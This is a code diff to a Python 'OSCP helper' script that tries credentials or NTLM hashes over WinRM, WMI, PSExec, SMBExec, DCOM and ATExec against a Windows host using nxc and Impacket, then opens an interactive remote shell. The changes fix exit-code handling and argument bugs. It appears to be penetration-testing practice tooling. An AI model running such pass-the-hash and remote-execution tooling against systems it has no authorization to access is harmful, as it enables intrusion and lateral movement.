@@ -24,7 +24,6 @@ import argparse
 import shutil
 import subprocess
 import sys
-import time
 
 
 def die(msg):
@@ -55,7 +54,6 @@ def show_result(name, result):
         return False
     output = result.stdout.strip()
     if output:
-        # Keep output short; detailed output is not needed for the decision.
         lines = output.splitlines()
         for line in lines[-5:]:
             print(f"    {line}")
@@ -74,7 +72,6 @@ def nxc_base(protocol, target, domain, user, password=None, ntlm=None):
 
 
 def impacket_target(domain, user, password=None, ntlm=None, target=None):
-    # Impacket target syntax. For local accounts, use ./user.
     prefix = f"{domain}/{user}" if domain else f"./{user}"
     if password is not None:
         return f"{prefix}:{password}@{target}"
@@ -82,12 +79,30 @@ def impacket_target(domain, user, password=None, ntlm=None, target=None):
 
 
 def launch(cmd, label):
+    """Launch an interactive shell and report the truth about how it ended.
+
+    Does NOT assume success just because the process was spawned - checks
+    the real return code so a WinRMAuthorizationError (or similar late
+    failure) is reported as a failure instead of silently exiting 0.
+    """
     print(f"\n[+] {label} succeeded")
     print("[*] Launching interactive shell...\n")
     try:
-        subprocess.run(cmd)
+        result = subprocess.run(cmd)
     except KeyboardInterrupt:
-        print("\n[*] Shell interrupted.")
+        print("\n[*] Shell interrupted by user.")
+        sys.exit(0)
+    except FileNotFoundError:
+        print(f"[-] {label}: binary not found at launch time.")
+        return False
+
+    if result.returncode != 0:
+        print(f"\n[-] {label} exited with error (code {result.returncode}).")
+        print("[-] Likely an authorization/session issue that nxc's check "
+              "didn't catch (e.g. account not in Remote Management Users, "
+              "or evil-winrm/Ruby reline incompatibility hanging the shell).")
+        return False
+
     sys.exit(0)
 
 
@@ -96,20 +111,16 @@ def test_winrm(args):
         return False
     print("[*] Testing WinRM...")
     cmd = nxc_base("winrm", args.target, args.domain, args.user,
-                   args.password, args.ntlm)
+                    args.password, args.ntlm)
     result = run_quiet(cmd)
     if result is None or result.returncode != 0:
         print("[-] WinRM authentication failed/unavailable")
         return False
-
-    # nxc may return success for authentication but not necessarily
-    # command execution. Confirm with a harmless command.
     cmd += ["-x", "whoami"]
     result = run_quiet(cmd)
     if result is not None and result.returncode == 0:
         print("[+] WinRM command execution confirmed")
         return True
-
     print("[-] WinRM authentication succeeded but command execution was not confirmed")
     return False
 
@@ -117,16 +128,18 @@ def test_winrm(args):
 def launch_winrm(args):
     if not have("evil-winrm"):
         print("[-] evil-winrm is not installed")
-        return
-    cmd = ["evil-winrm", "-i", args.target, "-u", args.user]
-    if args.domain:
-        # Evil-WinRM generally handles domain accounts via DOMAIN\\USER.
-        cmd += ["-u", f"{args.domain}\\{args.user}"]
+        return False
+
+    # Build -u exactly once. Domain accounts use DOMAIN\user; local accounts
+    # use the bare username. Previous version passed -u twice.
+    winrm_user = f"{args.domain}\\{args.user}" if args.domain else args.user
+    cmd = ["evil-winrm", "-i", args.target, "-u", winrm_user]
     if args.ntlm:
         cmd += ["-H", args.ntlm]
     else:
         cmd += ["-p", args.password]
-    launch(cmd, "WinRM")
+
+    return launch(cmd, "WinRM")
 
 
 def test_nxc_exec(protocol, args):
@@ -134,7 +147,7 @@ def test_nxc_exec(protocol, args):
         return False
     print(f"[*] Testing {protocol.upper()} command execution...")
     cmd = nxc_base(protocol, args.target, args.domain, args.user,
-                   args.password, args.ntlm)
+                    args.password, args.ntlm)
     cmd += ["-x", "whoami"]
     result = run_quiet(cmd)
     return show_result(protocol.upper(), result)
@@ -143,14 +156,14 @@ def test_nxc_exec(protocol, args):
 def launch_impacket(tool, args, label):
     if not have(tool):
         print(f"[-] {tool} is not installed")
-        return
+        return False
     target = impacket_target(
         args.domain, args.user, args.password, args.ntlm, args.target
     )
     cmd = [tool, target]
     if args.ntlm:
         cmd += ["-hashes", f":{args.ntlm}"]
-    launch(cmd, label)
+    return launch(cmd, label)
 
 
 def test_psexec(args):
@@ -166,8 +179,6 @@ def test_smbexec(args):
 
 
 def test_dcom(args):
-    # DCOM is not consistently exposed by nxc, so use a short command
-    # through the Impacket client itself. This may create remote artifacts.
     tool = "impacket-dcomexec"
     if not have(tool):
         return False
@@ -218,14 +229,16 @@ def build_parser():
 
 def main():
     args = build_parser().parse_args()
-
     print(r"""
 ============================================================
                  WIN-SHELL / OSCP HELPER
 ============================================================
 """)
+    # No backslash inside f-string expressions (breaks on Python < 3.12) -
+    # build the display string beforehand instead.
+    user_display = f"{args.domain}\\{args.user}" if args.domain else args.user
     print(f"[*] Target : {args.target}")
-    print(f"[*] User   : {args.domain + '\\\\' if args.domain else ''}{args.user}")
+    print(f"[*] User   : {user_display}")
     print(f"[*] Auth   : {'NTLM hash' if args.ntlm else 'password'}")
     print(f"[*] Method : {args.method}\n")
 
@@ -237,7 +250,6 @@ def main():
         "dcomexec": ["impacket-dcomexec"],
         "atexec": ["impacket-atexec"],
     }
-
     if args.method != "auto":
         missing = [x for x in required[args.method] if not have(x)]
         if missing:
@@ -247,7 +259,6 @@ def main():
     # ATExec is tested last because it provides command execution, not a
     # native interactive shell.
     methods = ["winrm", "wmiexec", "psexec", "smbexec", "dcomexec", "atexec"]
-
     if args.method != "auto":
         methods = [args.method]
 
@@ -255,28 +266,28 @@ def main():
         if method == "winrm":
             if not test_winrm(args):
                 continue
-            launch_winrm(args)
-
+            if launch_winrm(args):
+                sys.exit(0)
         elif method == "wmiexec":
             if not test_wmi(args):
                 continue
-            launch_impacket("impacket-wmiexec", args, "WMIExec")
-
+            if launch_impacket("impacket-wmiexec", args, "WMIExec"):
+                sys.exit(0)
         elif method == "psexec":
             if not test_psexec(args):
                 continue
-            launch_impacket("impacket-psexec", args, "PSExec")
-
+            if launch_impacket("impacket-psexec", args, "PSExec"):
+                sys.exit(0)
         elif method == "smbexec":
             if not test_smbexec(args):
                 continue
-            launch_impacket("impacket-smbexec", args, "SMBExec")
-
+            if launch_impacket("impacket-smbexec", args, "SMBExec"):
+                sys.exit(0)
         elif method == "dcomexec":
             if not test_dcom(args):
                 continue
-            launch_impacket("impacket-dcomexec", args, "DCOMExec")
-
+            if launch_impacket("impacket-dcomexec", args, "DCOMExec"):
+                sys.exit(0)
         elif method == "atexec":
             if test_atexec(args):
                 print("\n[+] ATExec command execution works")
